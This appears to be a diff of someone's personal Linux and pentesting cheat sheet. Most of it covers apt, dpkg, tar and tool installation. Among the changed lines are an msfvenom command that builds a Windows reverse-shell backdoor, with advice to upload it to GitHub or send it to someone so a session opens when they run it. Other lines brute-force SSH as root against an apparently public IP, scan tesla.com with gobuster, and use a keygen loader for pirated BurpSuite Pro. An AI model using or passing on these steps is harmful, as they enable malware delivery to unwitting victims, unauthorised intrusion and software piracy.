@@ -1,12 +1,81 @@
-How To Quickly Get Linux Up-To-Speed Cuz You Fucked It Up Again:
-sudo apt-get clean
-sudo apt-get update
-sudo apt-get upgrade -y
-sudo apt-get dist-upgrade -y
-sudo apt-get full-upgrade -y
-sudo apt-get install git
-sudo apt install python3-pip
-	sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get dist-upgrade -y && sudo apt-get full-upgrade -y
+How to update/upgrade Linux:
+What does APT do?
+
+APT (Advanced Packaging Tool) is a set of core tools found inside the Debian operating system. It provides utilities for the installation and removal of software packages and dependencies on a system.
+
+apt is a subset of apt-get and apt-cache commands providing necessary commands for package management.
+while apt-get won’t be deprecated, as a regular user, you should start using apt more often.
+
+sudo apt install
+	Installs a package
+
+sudo apt remove
+	Removes a package
+
+sudo apt purge
+	Removes package with configuration
+
+sudo apt update
+	Refreshes repository index
+
+sudo apt upgrade
+	Upgrades all upgradable packages
+	
+sudo apt autoremove
+	Removes unwanted packages
+	
+sudo apt full-upgrade
+	Upgrades packages with auto-handling of dependencies
+	
+sudo apt search
+	Searches for a program 
+
+sudo apt show
+	Shows package details
+	
+sudo apt list
+	Lists packages with criteria (installed, upgradable etc)
+
+sudo apt edit-sources
+	edits sources list
+
+sudo apt clean
+	The clean command clears out the local repository of downloaded package files. It removes everything except the partials folder and lock file from /var/cache/apt/archives/. Use apt clean to free up disk space when necessary, or as part of regularly scheduled maintenance.
+
+sudo apt autoclean
+	autoclean is another method used to clear out the local repository of downloaded package files, just like clean. The difference between clean and autoclean is that the latter only removes package files that can no longer be downloaded from their sources, and are very likely to be useless.
+	
+sudo apt update && sudo apt upgrade -y && sudo apt full-upgrade -y && sudo apt autoremove -y
+===========================================================================================================================
+First things to do after installing Linux:
+1. Download and Install Latest Updates
+	sudo apt update && sudo apt upgrade
+2. Install GNOME Tweak Tool
+	sudo apt install gnome-tweak-tool
+3. Install Git 
+	sudo apt install git
+4. Install PIP
+	sudo apt install python3-pip
+5. Install GNOME Extensions
+	Just go to https://extensions.gnome.org/ to download and install your preferred extensions.
+6. Play with Different Desktop Environment 
+	To try MATE, run following command in Terminal.
+		sudo apt install Ubuntu-mate-desktop
+	
+	To try Cinnamon, run following command in Terminal.
+		sudo apt-get install cinnamon-desktop-environment
+	
+	To try KDE, run following command in Terminal.
+		sudo apt-get install kde-standard
+
+
+	
+===========================================================================================================================
+How to install a dpkg:
+
+dpkg is a tool for installing, removing, and querying individual packages. 
+
+	dpkg -i ~/Downloads/file.deb
 ===========================================================================================================================
 How to fix HTB openvpn connection issue:
 # vim /etc/sysctl.conf
@@ -36,12 +105,19 @@ Free BurpSuite Pro installation:
 	2. Run 'BurpSuite Loader & Keygen'
 	3. Press 'run' in upper right hand corner and Burpsuite will load
 ===========================================================================================================================
-How to install dpkg:
-	dpkg -i ~/Downloads/file.deb
-===========================================================================================================================
-<h1>Routersploit:</h1>
 
-<h3>Install:</h3> 
+===========================================================================================================================
+How to uncompress with tar:
+	
+    -x = extract
+    -z = gzipped archive
+    -f = get from a file (must be the last command)
+	
+	'sudo tar -xzf utorrent-server-3.0-ubuntu-10.10-27079.tar.gz'
+===========================================================================================================================
+Routersploit:
+
+Install:
 	sudo apt-get install python-dev python-pip libncurses5-dev git
 	git clone https://github.com/reverse-shell/routersploit
 	cd routersploit
@@ -218,7 +294,7 @@ Command line options for dir mode
     -P <password> – HTTP Authorization password (Basic Auth only, prompted if missing).
     -U <username> – HTTP Authorization username (Basic Auth only).
     -to <timeout> – HTTP timeout. Examples: 10s, 100ms, 1m (default: 10s).
-		"gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u https://www.tesla.com"
+		"gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u https://10.10.10.84"
 ===========================================================================================================================
 #Wfuzz:
 
@@ -415,7 +491,7 @@ Priv: Timestomp Commands
     timestomp     Manipulate file MACE attributes
 
 Creating an executable backdoor with Metasploit:
-	"msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.141 -f exe -o payload.exe"
+	"msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.141 LPORT=4444 -f exe -o payload.exe"
 The backdoor.exe file is saved in the path where you executed the command. Upload this file to GitHub or send it to someone, once they open it, your meterpreter session will start
 
 LHOST= Your IP
@@ -560,6 +636,13 @@ Crunch Wordlist:
 	crunch 4 4 012345abcdef -o Documents/pass.txt
 ===========================================================================================================================
 Hydra:
+Install hydra with the following commands:
+	$ git clone https://github.com/vanhauser-thc/thc-hydra.git
+	$ cd thc-hydra/
+	$ ./configure
+	$ make
+	$ make install
+	
 	hydra -l admin -P /home/kali/htb/nineveh/10k 10.10.10.43 http-post-form "/department/login.php:username=^user^&password=^PASS^:Invalid" -t 64
 
 	hydra -l root -p admin 69.167.51.201 -t 4 ssh
